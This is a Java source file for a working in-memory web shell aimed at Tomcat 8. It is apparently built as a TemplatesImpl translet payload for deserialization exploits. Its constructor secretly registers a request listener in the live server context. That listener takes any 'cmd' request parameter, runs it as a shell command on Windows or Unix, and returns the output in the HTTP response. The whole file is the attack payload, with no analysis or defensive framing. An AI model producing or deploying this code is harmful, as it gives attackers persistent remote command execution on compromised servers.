package test;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import java.io.*;
import java.lang.reflect.Field;
import java.util.Scanner;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;

import org.apache.catalina.connector.Request;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;

public class TemplatesImplTomcat8ListenerShell extends AbstractTranslet implements ServletRequestListener{
    public TemplatesImplTomcat8ListenerShell() throws Exception {
    	WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
    	StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
    	standardContext.addApplicationEventListener(this);
    	//Object[] obj = {this};
    	//standardContext.setApplicationEventListeners(obj);
    }
    public void requestDestroyed(ServletRequestEvent sre) {
		Request request;
        HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();
        try {
            Field requestF = req.getClass().getDeclaredField("request");
            requestF.setAccessible(true);
            request = (Request)requestF.get(req);
		} catch (Exception e) {
			request = (Request) req;
		}
        if (req.getParameter("cmd") != null){
            try {
                String cmd = req.getParameter("cmd");
                boolean isWin = java.lang.System.getProperty("os.name").toLowerCase().contains("win");
                String[] cmds = isWin ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\a");
   				String output = s.hasNext() ? s.next() : "";
   				request.getResponse().getWriter().write(output);
            }
            catch (Exception e) {}
        }
    }
    public void requestInitialized(ServletRequestEvent sre) {}
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
    }
    @Override
    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException {
    }
    

}